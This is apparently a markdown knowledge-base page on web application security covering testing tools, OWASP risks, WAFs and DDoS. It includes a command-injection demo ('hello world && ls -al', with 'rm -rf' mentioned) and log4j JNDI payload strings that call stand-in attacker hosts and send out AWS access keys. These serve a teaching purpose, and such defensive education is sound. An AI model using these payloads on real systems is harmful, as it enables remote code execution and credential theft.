
# Web application security

Securing web applications is not a single pronged approach. The **Defense in depth** strategy allows multiple layers of security that focus on delaying the attack rather than completely preventing it often compared to a **castle** with multiple walls of protection. The more layers of defense you have, the attack will lose momentum and you’ll have more time to respond appropriately. A Defense in Depth strategy is designed to increase the cost and effort of an attack against an organisation.

## Security requirements

We often have well defined tools and techniques for gathering functional requirements of a system. e.g. user stories, acceptance criteria, definition of done within a BDD approach. But we do not see the same level of maturity amongst teams when it comes to gathering non functional requirements, especially those related to security. This could be due to a number of factors:

* Deep technical knowledge maybe required
* Do not always have a security expert on board
* Stakeholders may not be aware of the security cost to revenue and unwilling to invest time and resource. You can never be 100% secure but it is worth thinking about what good looks like from a security point of view
  * How urgently do you fix a vulnerability identified in a production system?
  * Do you understand the risk of letting the system run with vulnerabilities?
  * What is the organisation's appetite for risk? What kind of data are you dealing with? e.g, finance, healthcare or provider of publicly available traffic data
  * Is certain amount of downtime acceptable to you?

### Gates to guardrails

Traditional approaches to secure development lifecycle have relied on high-touch and process-driven models involving a series of assessments (e.g. design review, threat model, vulnerability scan) and associated decisions on whether to proceed to the next phase and gate. While this model serves many well, there are an increasing number of organizations embracing concepts like DevOps, agile, cloud, and continuous delivery that are looking for more pragmatic, automated, and dynamic approaches that suit the technology and business environments in which they exist. Tension between SecOps, DevOps and application developers can lead to disjointed teams. How do you apply consistent security policies across multiple architectures?

Moving [from gates to guardrails](https://www.oreilly.com/library/view/devopssec/9781491971413/ch04.html) involves providing guidance and tooling to development teams to insert security policies into their delivery pipelines rather than introducing delays via security compliance gates. Some of the [ways Netflix has approached this shift](https://www.youtube.com/watch?v=geumLjxtc54), emphasizing practical methods to problems ranging from continuous assessment to regulatory compliance to team staffing.

Data between the end user and your application flows through the data plane. Thinking of security as a horizontal capability across the data plane and use the metrics and telemetry from the data plane to get visibility of the applied security policies and application threats.

## Security theater

Security theater is the practice of investing in countermeasures intended to provide the feeling of improved security while doing little or nothing to actually achieve it. Be aware of security theater <https://security.stackexchange.com/questions/112037/how-to-avoid-reveal-password-in-a-form>

## Web Application Security

Applications, especially those that are cloud native, are a gateway to servers and networks and present an ideal attack vector for malicious actors.

In order to understand and address your security requirements it is worth understanding the approaches and tools at hand. The security testing process involves:

* assessment - analysis and discovery of vulnerabilities without attempting to actually exploit those vulnerabilities
* testing - discovery and attempted exploitation of vulnerabilities. [OWASP Application Security Verification Standard](https://owasp.org/www-project-application-security-verification-standard/) is an open standard for web application security verification.
* vulnerability management: National Vulnerability Database - <https://nvd.nist.gov/> and <https://cve.mitre.org/>

### Web Application Security Tools

[Application Security](https://snyk.io/learn/application-security/) scanning tools include:

* Source code analysis - also known as [Static application security testing (SAST)](https://snyk.io/learn/application-security/static-application-security-testing/) or white box testing is used to analyse source code for security vulnerabilities. SAST tools are good at identifying well-known vulnerabilities such as Buffer overflows and SQL injection, however they result in high number of false positives and are [limited in identifying many types of vulnerabilities](https://owasp.org/www-community/Source_Code_Analysis_Tools) including Authentication problems, Access control issues, Insecure use of cryptography. Selecting a SAST tool depends upon a number of factors within your organisation:
  * Ideally the SAST solution should be implemented as part of CI but depending upon the ways of working within an organisation it can be used as a service by dev teams to request adhoc scans as part of part of regulatory/compliance mandate.
  * Depending upon the vendor, a SaaS solution in a fully-automated solution may not be as responsive and may introduce some challenges when troubleshooting issues - means logging into the SaaS providers platform and calling support. On-prem deployments offer more flexibility and speed but introduce compute and operating costs.
  * How will the SAST results be managed and integrated with the vulnerability management function. This includes pulling results into a issue tracker e.g. Jira, dashboard, reporting, etc.
  * Whether the programming language in use is supported by the tool
* Some examples of SAST tools are:
  * SonarQube - not strictly a SAST product but focussed on code quality/review and identifying basic application vulnerabilities. The security rule set is small in comparison to a commercial security product e.g. it can miss simple XSS JS vulnerability.
  * Checkmarx | <https://github.com/checkmarx-ltd/cx-flow/> integrates CxSAST, CxSCA scans with issue tracking systems via webhooks and open/close/manage issues in Jira
  * Snyk code | <https://semgrep.dev/> provide fast scanning
  * Veracode
  * Coverity from Synopsis
  * Gitleaks | TruffleHog for secrets scanning
  * Checkov for IAC, however it is mainly a cli and does not provide vulnerability visualisation support
  * Semmle - part of GitHub Advanced Security offers fast scanning built directly into your SCM. The integrated approach can help companies with limited App Sec capabilities move quickly forward on code scanning requirements.

* Interactive application security testing (**IAST**): This form of application security testing is a [hybrid approach](https://www.securityjourney.com/post/sast-vs-dast-vs-iast) that tries to solve the drawbacks of SAST and DAST by combining the best of both. It scans the source code for vulnerabilities while the application is running and and can show the exact location of a vulnerability, unlike DAST. IAST tools work by deploying agents and sensors in a running web application. This can add setup complexity due to possible compatibility issues with the application technology. The role of these agents is to continuously monitor and analyze the application's behavior during manual or automated tests.

* Software Composition Analysis - Rather than analysing source code an **SCA** tool focuses on third-party code dependencies that are used in the application.  According to an Accenture & WEF security report, supply chain attacks were highlighted as a major cyber threat according to business leaders in 2023. 
  * Solar winds SC attack is one of the largest if not the largest attack of its kind. It affected more than  30,000 public & private orgs using the Orion network management system to manage their IT resources. As a result, the hack compromised the data, networks and systems of thousands when SolarWinds inadvertently delivered a backdoor malware as an update to the Orion software.
  * SBOMs provide transparency into the components that make up your software - providing artifact integrity and provenance, helping in securing software supply chains. There are a couple of general frameworks available but the scope of these frameworks is pretty wide, hence finding the appropriate level of measures to put in place is a key challenge.
    * https://slsa.dev/
    * https://in-toto.io
    * NIST's SSDF https://csrc.nist.gov/Projects/ssdf
  * Securing integration, deployment and runtime related components and procedures, starting with
      1. produce SBOM data
      2. storing SBOM data and other attestations
      3. aggregating and pre-processing data
      4. query data for specific operations (most likely validation during deployment and other automated (reactive) response actions)
  * Vendors like Snyk, Synopsis, mend.io provide SCA tooling
  * <https://owasp.org/www-project-dependency-check/> is a utility that identifies project dependencies and checks if there are any known, publicly disclosed, vulnerabilities

* Runtime testing - also known as Dynamic application security testing **DAST** or black box testing is used to discover security vulnerabilities while an application is running e.g. looking at the request and responses to the system. It does not require access to the application’s source code. A web application security scanner acts as a *"man in the middle proxy"* and typically sits between the tester's browser and the web application so that it can intercept and inspect messages sent between browser and web application, modify the contents if needed, and then forward those packets on to the destination. Some tools to consider:
  * [OWASP ZAP](https://www.zaproxy.org/) - Free and open source, can run headless as a daemon with a REST API. ZAP provides a [baseline scan feature](https://www.zaproxy.org/blog/2020-04-09-automate-security-testing-with-zap-and-github-actions/) to find common security faults in a web application without doing any active attacks. The scan can be integrated into your CI/CD pipelines using GitHub Actions.
  * [Open VAS](https://www.openvas.org/) - Open Vulnerability Assessment Scanner

* Penetration testing – The system undergoes analysis and attack from simulated malicious attackers.  It has the advantage of being more accurate because it has fewer false positives (results that report a vulnerability that isn’t actually present), but can be time-consuming to run. It generally happens out of band i.e. outside your CI/CD workflow, however **automated pen testing** part of CI validation can help uncover new vulnerabilities as well as regressions for previous vulnerabilities in an environment which quickly changes. Tools to consider
  * [BURP Scanner](https://portswigger.net/burp) - One of the best manual penetration testing tools out there, however a [comparison with Netsparker](https://www.netsparker.com/vulnerability-scanner-comparison/netsparker-vs-burp-suite/#) reveals it can be complicated to configure and relatively less focussed on automation and integration with other tools.
  * [Qualys web app scanning](https://www.qualys.com/apps/web-app-scanning/?_ga=2.142204082.1235140357.1591144958-1421731482.1591144958) - cloud based web app discovery and detection of vulnerabilities and misconfigurations
  * [Intruder](https://www.intruder.io) - SaaS based vulnerability scanner, provides [comparisons with other solutions](https://www.intruder.io/qualys-alternative)  

* **Fuzzing**: Fuzzing tests an application by inputting randomized data to uncover potential bugs. It compliments IAST, DAST, SAST, and other forms of testing.

## Web Application Security Risks

The [OWASP Top 10](https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet) provides list of the 10 Most Critical Web Application Security Risks

* Broken Access Control can result in information disclosure, modification or destruction of all data.
* Identification and authentication failures are exploited using credential stuffing, brute force password attacks, weak or well known passwords. Authentication responsibility can be offloaded to an external identity provider with baked in credentials protection. Some techniques used for authenticating and [securing APIs](https://docs.oracle.com/middleware/1212/owsm/OWSMC/owsm-security-concepts.htm) are:
  * [IP address-based ACLs](https://joelgsamuel.medium.com/ip-address-access-control-lists-are-not-as-great-as-you-think-they-are-4176b7d68f20) - hard to manage and not necessarily the most secure
  * Certificate based Mutual TLS
  * HTTP Basic authentication
  * API Specific authentication
    * API Key - shared secret
    * JSON Web Token (JWT)

* Injection can include SQL injection and Cross-Site Scripting (XSS)
  * Untrusted data, without input sanitization is sent to the code interpreter by an attacker. There are serious security implications if any part of the string that a user passes can not be fully trusted.
  * Use **context aware escaping** - ensure that user input is treated as literal text (escaped) as opposed to something that is executable code, depending upon the context in which it is used. e.g. The process of escaping data for SQL - to prevent SQL injection - is very different from the process of escaping data for (X)HTML, to prevent [XSS](Cross%20Site%20Scripting.md).

    ```python
    import os
    import subprocess

    # allowing executable code, results in executing the command 'ls -al' - information disclosure
    # this can have serious implications if someone were to pass 'rm -rf' - data destruction
    e ='echo'
    input = 'hello world && ls -al'
    os.system(f"{e} {input})" 
    
    # output
    hello world
    total 84
    drwxr-xr-x 9 azureuser azureuser  4096 Oct 11 12:00 .
    drwxr-xr-x 3 root      root       4096 Oct  6 12:57 ..
    
    # ensuring the inputs are properly escaped
    subprocess.call([e,input])
    
    # output
    hello world && ls -al
    0
    ```

  * Injection can also result in **Remote code execution (RCE)** attacks e.g. [log4j vulnerability](https://www.youtube.com/watch?v=uyq8yxWO1ls&ab_channel=JavaBrains). Log injection is relatively harmless but combining it with ability to run remote code can be problematic.
  
    ```java
    final Logger logger = LogManager.getLogger(...);
    logger.error("Error message: {}", error.message());

    // Search page log
    logger.info("User {} searched for {}", user.getId(), searchTextInput);

    // if attacker sets up a remote JNDI server with malicious code and passes that as the search input,
    // it will result in the affected application that is using log4j running this remote malicious code
    searchTextInput = "$jndi:ldap://my-evil-ldap/maliciousobject}"

    // attacker can also lookup application environment variables and send them over to the remote JNDI server
    searchTextInput = "$jndi:ldap://evil.attacker:1234/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}}"
    ```

### Layer 7 protection

HTTP based communication can be secured by deploying a Web Application Firewall (WAF) for broad range of layer 7 attacks such as SQL Injection, Cross Site Scripting, Local/Remote File Inclusion and Remote Code Execution which all together account for majority of application layer attacks.

#### ModSecurity WAF

ModSecurity is an open source WAF for securing applications, used by over a million sites around the world.

* Inspects incoming HTTP requests for anomalies
* Uses database of rules to define behaviours. It supports:
  * free open source OWASP ModSecurity Core Rule Set (CRS) with generic attack detection
  * commercial TrustWave rule set (rule package updated daily) that works alone or with OWASP CRS with specific attacks & accuracy,
* Traffic that violates rules are dropped and/or logged

The latest version, ModSecurity 3.0, has a modular architecture that runs natively in NGINX. Previous versions worked only with the Apache HTTP Server. Modsecurity can be [complied and installed for open source inginx](https://www.nginx.com/blog/compiling-and-installing-modsecurity-for-open-source-nginx/) and other reverse proxies like [HAProxy](https://www.haproxy.com/haproxy-web-application-firewall-trial/)

#### DDOS Protection

A denial of service attack is not limited to layer 7 when a web server receives a flood of GET/POST requests, but it can also be

* SYN flood attack - A TCP connection requires 3 way handshake between the client and the server
  * Client -> SYN packet -> Server
  * Server -> SYN-ACK -> Client
  * Client -> ACK -> Server
  * The client overwhelms ther server by sending SYN packets without sending ACK, crossing the number of TCP connections the server can support
* [NTP amplification attack](https://www.cloudflare.com/en-gb/learning/ddos/ntp-amplification-ddos-attack) - The Network Time Protocol is designed to allow internet connected devices to synchronize their internal clocks, and serves an important function in internet architecture. The `monlist` command is a feature of NTP that allows a client to request a list of the last 600 IP addresses that have sent NTP packets to the server. In an NTP amplification attack, an attacker sends a spoofed "monlist" request to a vulnerable NTP server, which then responds with a large amount of data (up to 600 times the size of the original request) to the victim's IP address. This amplifies the attack traffic and can overwhelm the victim's network, causing a denial-of-service (DoS) condition. The use of the "monlist" command in NTP has been deprecated due to its potential for abuse in amplification attacks.

![nginx-dos-protection.jpg](../../Images/nginx-dos-protection.jpg "Nginx DOS protection")

### Protection offered by the browser

* Maintains a comprehensive list of phishing sites, warn the user against visiting such sites
* Check validity of SSL certificate.
* Detect weak cryptography, deficiency in the TLS (Transport layer security) or its predecessor SSL (Secure Sockets Layer) implementation.
* Detect pages with mixed content - A page served over https that also has content served over http. Chrome shows a yellow triangle over the padlock to warn the user.
* Apply [Security headers](./Security%20Headers.md) to protect against common vulnerabilities. Some free basic website scanning for security tools
  * <https://observatory.mozilla.org>
  * <https://securityheaders.com/>

### Protection not offered by the browser

* Parameter tampering (cookies, forms, headers, strings). Modifying attributes of the request (query string, changing ids).
* Persistent cross site scripting.
* Attackers making direct HTTP requests (access to unauthorized resources, deleting a resource).

These types of attempts can only be effective if the attacker is able to exploit an existing vulnerability, like a non secure API, SQL injection or gaining access to credentials.

## Learning Resources

You can use your existing website or **test websites** to learn how to identify risk e.g.

* Google's firing range - <https://github.com/google/firing-range>
* OWASP juice shop
  * <https://owasp.org/www-project-juice-shop>
  * <https://github.com/bkimminich/juice-shop>
* Hack yourself fist - <https://www.troyhunt.com/hack-yourself-first-how-to-go-on/> is a great place to start actively seeking out vulnerabilities
* Crowd security testing platforms like <https://www.openbugbounty.org> allow security researchers to report a vulnerability on any website and submit it to Open Bug Bounty for responsible disclosure. The role of Open Bug Bounty is limited to independent verification of the submitted vulnerabilities and proper notification of website owners. Once notified, the website owner and the researcher are in direct contact to remediate the vulnerability and coordinate its disclosure.